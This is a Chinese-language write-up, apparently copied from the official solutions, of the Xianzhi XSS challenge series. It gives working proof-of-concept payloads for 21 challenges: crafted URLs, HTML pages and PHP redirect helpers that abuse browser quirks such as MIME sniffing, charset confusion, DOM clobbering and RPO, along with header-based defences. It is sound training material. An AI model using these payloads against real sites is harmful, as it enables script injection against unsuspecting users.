### 先知XSS挑战赛

___以下xss题目，我一个都不会，所以无耻的抄了[比赛的wp](https://mp.weixin.qq.com/s/d_UCJusUdWCRTo3Vutsk_A)___

**出题人：M 审核人：Mannix**

##### 这里做一个题目收集和整理

M师傅语录
>  题目很多围绕着security header来出题，希望开发者重视这些问题，在防御上，正确的设置下面的值，是能够避免很多问题. content-type、x-xss-protection、x-frame-options、x-content-type-options


#### [xss1.php](./xss1.php)

此题目的难点是利用html表单上传文件，来达到自动化利用的目的。

参考以下文章：
> http://blog.bentkowski.info/2015/05/xss-via-file-upload-wwwgooglecom.html
> http://kuza55.blogspot.hk/2008/02/csrf-ing-file-upload-fields.html

最后的poc是：
**注意次poc不能再firefox和chrome上使用**
```html
<html>
<body>
    <form id="xss" action="./xss1.php" method="POST" enctype="multipart/form-data">
      <textarea type="text" id="vulnerable" value="" /></textarea>
    </form>
 <script>
 var tarfile = "test";
 var vuln = document.getElementById('vulnerable');
 vuln.name = "x\"; name=fileToUpload; filename=\"<img src=1 onerror=alert(document.domain)>.jpg";
 vuln.value = (tarfile);
 document.getElementById("xss").submit();
 </script>
</body>
</html>
```

#### [xss2.php](./xss2.php)

此题就是会把HTTP所有信息输出到页面，但是不能使用Referrer .
所以矛盾就在怎么请求这个地址，而且又是能够利用代码自动化的添加头去请求.

这里面特别要注意的是开始的两个头
```php
header('Pragma: cache');
header("Cache-Control: max-age=".(60*60*24*100));
```
也就是浏览器会对网页进行缓存，那么如果第一次我能够修改http头然后再进行跨域请求，第二次再请求一次的时候，http的信息还是不会变的，因为直接读取了本地缓存内容.

所以可以使用Fetch先请求，在利用iframe框架进行第二请求，另外注意的就是需要通过meta标签来设置一下referrer，也就是第二次iframe加载的时候是不带referer的.按道理可以在FF下面也成功，不过好像FF不支持meta这样禁止referer

```html
<html>
<head>
    <meta name="referrer" content="never">
    <script>
        var request = new Request('./xss2.php', {
            method: 'GET',
            mode: 'no-cors',
            redirect: 'follow',
            headers: new Headers({
                'Content-Type': 'text/plain',
                'Accept': 'application/jsona<img src=1 onerror=alert(document.domain)>',
            })
        });
        fetch(request).then(function () {
            console.log(1);
        });
    </script>
</head>
<body>
    <iframe src="./xss2.php"></iframe>
</body>

</html>
```

> ref: https://www.w3.org/TR/cors/#simple-header 

#### [xss3.php](./xss3.php)

这个题目问题在于返回头是application/json，又应该如何xss

这里利用了IE一个bug，参考文章：http://www.qingpingshan.com/jb/javascript/184536.html

exp:
3.html
```html
<meta charset=utf-8>
<iframe id=x src=3.php></iframe>
<script>
x.location.reload();
</script>
```

3.php
```php
<?php
header("location: http://xianzhi.aliyun.com/xss3333.php?value=%3Cimg%20src=x%20onerror=alert(document.domain)%3E");
?>
```
修复方案: 加上响应头，X-Content-Type-Options: nosniff

#### [xss4.php](./xss4.php)

输出点是referer，chrome、firefox会对query进行url编码，但是IE并不会

参考文章：
> http://www.mottoin.com/88317.html
> http://www.hackdig.com/?04/hack-9586.htm

IE11 exp: `http://ns1.rootk.pw:8080/xss/wp/4.html?a<img src=1 onerror=alert(document.domain)>`

```html
<html>
<body>
<form id="xss"
      name="xss"
      method="GET"
      action="http://xianzhi.aliyun.com/xss4.php">
</form>
<script>
document.getElementById("xss").submit();
</script>
</body>
</html>
```
M师傅语录
>  Referrer不会被URL编码的现象，主要是在Windows7和Windows8.1 Win10的IE11以前也有，不过在打完Anniversary Update补丁之后，在对referrer的处理上做了一些改动。变成了会对referrer进行URL编码

所以比较通用的办法是通过flash发送请求，AS代码如下：

```js
package {
import flash.display.Sprite;
import flash.net.URLRequest;
import flash.net.navigateToURL;
public class xss_referrer extends Sprite{
  public function xss_referrer() {
   var url:URLRequest = new URLRequest("https://vulnerabledoma.in/xss_referrer");
   navigateToURL(url, "_self");
  }
}
}
```
Ref:http://masatokinugawa.l0.cm/2016/10/referrer-xss-win10.html
另外在找资料也看到一些东西，记录一下

```bash
 # 会传送referer
> https->https
> http->https
 http->http

# 不会传送refer
https->http
```

#### [xss5.php](./xss5.php)

此题目主要是想办法去让浏览器不进行跳转.

翻到p师傅blog曾经对bottle http注入的一段: https://www.leavesongs.com/PENETRATION/bottle-crlf-cve-2016-9964.html

这里我使用的是端口小于80，FF就不会进行跳转

FF exp:
```url
http://xianzhi.aliyun.com/xss5.php?url=http://baidu.com:0/'%3E<img src=1 onerror=alert(document.domain)><a>
```

#### [xss6.php](./xss6.php)

这个是需要绕过文件下载，在第5题中p师傅的文章里面提到了一个点
```
为PHP的header函数一旦遇到\0、\r、\n这三个字符，就会抛出一个错误，此时Location头便不会返回，浏览器也就不会跳转了
```
同理是可以用在文件下载中

ff exp:
```url
http://xianzhi.aliyun.com/xss6.php?url=http://ns1.rootk.pw:8080/xss/wp/6.php&filename=aaa%0a
```
ref: https://twitter.com/mramydnei/status/782324732897075200

#### [xss7.php](./xss7.php)

MIME的题目，返回头Type为text/plain应该如何绕过

找到一个近期公布的IE 0day
https://jankopecky.net/index.php/2017/04/18/0day-textplain-considered-harmful/

利用的是email文件，里面的内容会被解析html，这里可以利用iframe来加载目标地址，这样内容就会被解析啦。

IE exp:http://ns1.rootk.pw:8080/xss/wp/9.eml

9.eml
```
TESTEML
Content-Type: text/html
Content-Transfer-Encoding: quoted-printable

=3Ciframe=20src=3D=27http=3A=2f=2fxianzhi.aliyun.com=2fxss7.php=3Furl=3Dhttp=3A=2f=2fns1.rootk.pw=3A8080=2fxss=2fwp=2f9.txt=3Fname=3D=3CHTML=3E=3Ch1=3Eit=20works=3C=2Fh1=3E=27=3E=3C=2Fiframe=3E
```

防御：这里多亏M师傅的提醒，文章中的X-Content-Type-Options: nosniff是可以防御的，相反X-Frame-Options: DENY并不能从根本去解决这个问题，这个只是防御了一种攻击方式，但是漏洞点却还在，真是留了一个大

ref: https://jankopecky.net/index.php/2017/04/18/0day-textplain-considered-harmful/


#### [xss8.php](./xss8.php)

此题想考察的是<后面还可以存在非字母形式的，空格等一些空白字符当然是不行的.

https://dev.w3.org/html5/spec-LC/parsing.html
```text
A sequence of bytes starting with: 0x3C 0x21 (ASCII '<!')
A sequence of bytes starting with: 0x3C 0x2F (ASCII '</')
A sequence of bytes starting with: 0x3C 0x3F (ASCII '<?')
```
可以看到还能以这些作为开头，在IE9、10里面有一个vector可以无交互执行js

8.txt

```
<% contenteditable onresize=alert(document.domain)>
```
现在问题就是IE11这个是无法触发的，但是可以通过x-ua-compatible设置文档兼容性，让它也能够兼容IE9、10的内容

**即便iframe内页面和父窗口即便不同域，iframe内页面也会继承父窗口的兼容模式，所以IE的一些老技巧、特性可以通过此方法去复活它.**
IE11 exp:http://ns1.rootk.pw:8080/xss/wp/8.html

8.html
```html
<meta http-equiv=x-ua-compatible content=IE=9>
<iframe id=x src="http://xianzhi.aliyun.com/xss8.php?url=http://ns1.rootk.pw:8080/xss/wp/8.txt"></iframe>
```

#### [xss9.php](./xss9.php)

代码简单，但是绝对够爽的一道题目，就是如何逃逸plaintext这个标签

我们有时候在使用浏览器的时候，也会遇到编码不同导致乱码问题，这个问题主要在于服务端和客户端之间的字符集存在差异导致的.

关于这个也找到一篇文章：https://www.ibm.com/developerworks/cn/web/wa-lo-ecoding-response-problem/index.html

上面的由于两端的差别导致的乱码，从xss角度出发，我们也就只能分析客户端 所以问题来了：http的响应头的编码、页面的meta等都可以设置头的东西，那么具体是什么时候具体对应的会起作用?

先来了解一下浏览器的一些解析过程.https://dev.w3.org/html5/spec-LC/parsing.html

第一个是ua里面已经确认指明了才会选择 第二个是http响应头大编码设置，也就是Content-Type，当它设置了charset并且支持这个charset，也就是不为空并且字符集是存在的，题目的编码是不存在的编码GB3212，所以符合 第三个就是如果meta标签设置编码是在html前1024个字节的时候，浏览器会根据这个编码去解析，这个是浏览器直接解析，完全是不受plaintext影响

所以第一步就是利用meta来改变页面的字符集.

第二步，需要做的就是去利用字符集之间的差异，寻找异类的字符集，

我们平常见到<的编码是\x3C，但是这个是UTF-8的，在其他编码的字符集中就有可能不是这个结果了，这里使用的是cp1025编码

附上一点cp1025的编码

```
<  %4c
>  %6e
/  %61
(  %4d
)  %5d
=  %7e
;  %5e
'  %7d
```

IE payload：
```
http://xianzhi.aliyun.com/xss9.php?text=<meta http-equiv="content-Type" content="text/html; charset=cp1025">%4c%89%94%87%01%a2%99%83%7e%f1%01%96%95%85%99%99%96%99%7e%81%93%85%99%a3%4d%f1%5d%0b%6e
```

#### [xss10.php](./xss10.php)

对框架不是很熟悉，提示是Client Side Template Injection，翻M师傅推特找到一个利用

FF && Chrome Exp

```
{{[].pop.constructor('alert()')()}}

http://xianzhi.aliyun.com/xss10.php?username=%7B%7B%5B%5D.pop.constructor(%27alert(1)%27)()%7D%7D
```

#### [xss11.js](./xss11.js)

HOST头注入，这里又需要用到IE下一个奇怪的姿势.

https://labs.detectify.com/2016/10/24/combining-host-header-injection-and-lax-host-parsing-serving-malicious-data/

所以可以构造

11.php

```php
<?php
header('HTTP/1.1 307 Redirect');
header('Location: '.$_GET['u']);
```

IE11 exp

```
http://ns1.rootk.pw:8080/xss/wp/11.php?u=http://ec2-52-15-146-21.us-east-2.compute.amazonaws.com%252f<%252ftitle><script>alert(document.domain)<%252fscript><!--.baidu.com
```

#### [xss12.php](./xss12.php)

先来了解一下IE的奇怪MIME判断。https://blog.fox-it.com/2012/05/08/mime-sniffing-feature-or-vulnerability/

因为有些服务器指定的不是一个正确的Content-Type头，所以IE为了兼容这些文件类型，它会将文件的前256个字节与已知文件头进行比较，然后得到一个结果…也就是<html>作为开头的话，会被认为是text/html

所以可以构造一下

IE exp:
```
http://xianzhi.aliyun.com/xss12.php?url=http://ns1.rootk.pw:8080/xss/wp/12.php
```

12.php

```php
<?php
header("Content-Type: application/octet-stream");
?>
<html><script>alert(document.domain)</script></html>
```
ref: https://xianzhi.aliyun.com/forum/read/224.html

#### [xss13.php](./xss13.php)

REQUEST_URI请求的xss，在IE下，加一次跳转就不会进行编码

IE exp:http://ns1.rootk.pw:8080/xss/wp/13.php

13.php
```
<?php
header("Location: http://xianzhi.aliyun.com/xss13.php/<svg/onload=alert(document.domain)>");
```
ref: https://speakerdeck.com/masatokinugawa/xss-attacks-through-path


#### [xss14.php](./xss14.php)

很久经典的一个问题，模糊记得xss书上有讲这个问题，因为标签里面有hidden属性的存在，导致大部分事件没法直接触发

所以一般分为两点，输出点是在hidden属性之前还是之后(不能闭合掉input的情况下)

之前则可以覆盖type为其他的，`<input value="a" src=1 onerror=alert(1) type="image" type="hidden">`
之后的话，只能通过间接的方式来触发，比如大家熟知的' accesskey='x' onclick='alert(/1/)，然后按shift+alt+x触发xss，但是还可以这样操作，无交互的触发xss，相比起来已经是无限制了，'style='behavior:url(?)'onreadystatechange='alert(1)
参考文章：http://masatokinugawa.l0.cm/2016/04/hidden-input-xss.html

IE exp:

```
http://xianzhi.aliyun.com/xss14.php?token=%27style=%27behavior:url(?)%27onreadystatechange=%27alert(1)
```

#### [xss15.php](./xss15.php)

很有意思的一个题目，一种防御iframe框架加载的方式，如果用框架加载的话，会让页面一直刷新….此题提示是DOM Clobbering

什么又是DOM Clobbering，在IE8下，abc.def将会是123

```html
<form id=abc def=123></form>
<script>
alert(abc.def)
</script>
```
那么题目中的self.location也就可以通过这样的方式去覆盖值.

IE exp:http://ns1.rootk.pw:8080/xss/wp/15.html

```
<meta http-equiv=x-ua-compatible content=IE=8>
<iframe src="http://xianzhi.aliyun.com/xss15.php?page=1'name=self location='javascript%3Aalert(document.domain)"></iframe>
```

当然还是需要注意调节兼容性，关于兼容性，可以看第八题的writeup 更多关于DOM Clobbering的文章: ref: http://www.thespanner.co.uk/2013/05/16/dom-clobbering/https://www.slideshare.net/x00mario/in-the-dom-no-one-will-hear-you-scream


#### [xss16.php](./xss16.php)

一个比较明显的RPO漏洞，但是国内对这方面介绍比较少

http://www.mbsd.jp/Whitepaper/rpo.pdf这个文档对RPO讲的比较清楚

总结起来就是因为php_self的存在，下面这个css会根据链接情况来加载

```
<link href="styles.css" rel="stylesheet" type="text/css" />
```

当我访问`xianzhi.aliyun.com/xss16.php`的时候，web相对路径就是/，这时候加载的css就是`xianzhi.aliyun.com/styles.css`

但是当我访问`xianzhi.aliyun.com/xss16.php/%7B%7D*%7Bbackground-color:%20red%7D*%7B%7D/`，也就是{}*{background-color: red}*{}，web的相对路径就是`/xss16.php/%7B%7D*%7Bbackground-color:%20red%7D*%7B%7D/`，这时候加载的css内容是`http://xianzhi.aliyun.com/xss16.php/%7B%7D*%7Bbackground-color:%20red%7D*%7B%7D/styles.css`

css的解析并没有像html那么严格，所以你可以看到网页将会被渲染为红色。

高潮部分来了，现在想办法就是利用css去加载jshttp://blog.innerht.ml/cascading-style-scripting/

可以利用sct文件，但是缺陷就是sct必须要是在同域下.

可以发现题目还有一个xss.png….内容如下

```
<scriptlet>
    <implements type="behavior"/>
    <script>alert(1)</script>
</scriptlet>
```
IE exp:

```
http://xianzhi.aliyun.com/xss16.php/{}*{behavior:url(http://xianzhi.aliyun.com/xss.png)}*{}/
```
当然css触发xss的，还可以用expression

ref: http://www.thespanner.co.uk/2014/03/21/rpo/

#### [xss17.php](./xss17.php)

输出点在div里面，这种被动元素如何去触发xss？

html5sec总结：https://html5sec.org/#145所以可以被动一点，需要用户点击一下之类操作去触发xss

IE exp:
```
http://xianzhi.aliyun.com/xss17.php?content=a%27%20style=%27-webkit-user-modify:read-write%27%20onfocus=%27alert(1)%27%20id=%27xss
```
但是M师傅提供了一个比较通用而且无需用户交互的poc

除FF以外的浏览器 exp:
```
http://xianzhi.aliyun.com/xss17.php?content=%27onfocus=%27alert(1)%27%20contenteditable%20tabindex=%270%27%20id=%27xss#xss
```
ref: https://github.com/cure53/XSSChallengeWiki/wiki/Mini-Puzzle-1-on-kcal.pw



#### [xss18.php](./xss18.php)

也是炒鸡好的题目，输入点在textarea里面，在不能闭合的情况下搞事情

有一个细节就是，开启了xss保护 在IE下，这个保护是他会把认为有害的字符过滤掉
![](http://mmbiz.qpic.cn/mmbiz_png/fwNqC4xHXIpgOSLQpYt4viblZnd3uT86iadXn0TKGCW6fI4scTFoGw6vmDdqsRcKcnV24OPiczTX1hFPDykeGFDiaQ/0.png?tp=webp&wxfrom=5&wx_lazy=1)

IE exp:
```
http://xianzhi.aliyun.com/xss18.php?input=%3Ctextarea%3E%3Cimg%20src=1%20on%3Cscript%3Eerror=alert(document.domain)%3E
```
ref: https://www.slideshare.net/codeblue_jp/xss-attacks-exploiting-xss-filter-by-masato-kinugawa-code-blue-2015


#### [xss19.php](./xss19.php)

http://xianzhi.aliyun.com/xss19.php?link=http://up.qqjia.com/z/face01/face06/facejunyong/junyong02.jpg

FF exp:

```
http://xianzhi.aliyun.com/xss19.php?link=data:image%2fsvg%2bxml,%3Cmeta%20xmlns=%27http://www.w3.org/1999/xhtml%27%20http-equiv=%27Set-Cookie%27%20content=%27username=%25%32%35%33%43script%25%32%35%33%65alert%25%32%35%32%381%25%32%35%32%39%25%32%35%33%43%25%32%35%32%66script%25%32%35%33%65%27%20/%3E
```

#### [xss20.php](./xss20.php)

IE exp
```
http://xianzhi.aliyun.com/xss20.php?hookid='%2b{valueOf:location, toString:[].join,0:'javascript:alert%25281%2529',length:1}%2b'
```

ref: https://twitter.com/xssvector/status/213631832053395456

#### [xss21.php](./xss21.php)

juqery高版本不适合一些低版本的浏览器，或者意外因素(中国网络环境)，cdn的jqeury可能会加载失败，这时候就需要加载一下本地的jquery，本地加载的jquery版本为1.6.1是存在漏洞

但是网络环境不可控，为了稳定的让受害者加载带有漏洞的jquery，那么一定要让cdn的jquery加载失败～

只要请求远程cdn时有某个header，比如说referrer，超出了cdn服务器所能接受的范围，就会产生拒绝请求的现象，比如很长串的字符.


chrome Exp:

```
http://xianzhi.aliyun.com/xss21.php?a=a....(中间省略9000个a)#<img src=1 onerror=alert(0)>
```
另外就是踩的一些坑
```
FF测试不成功，应该它对location.hash的操作，比如<还会url编码safai，空格会自动%20编码另外<svg/onload=alert(1)>操作不会成功，因为网页是已经加载好了
```

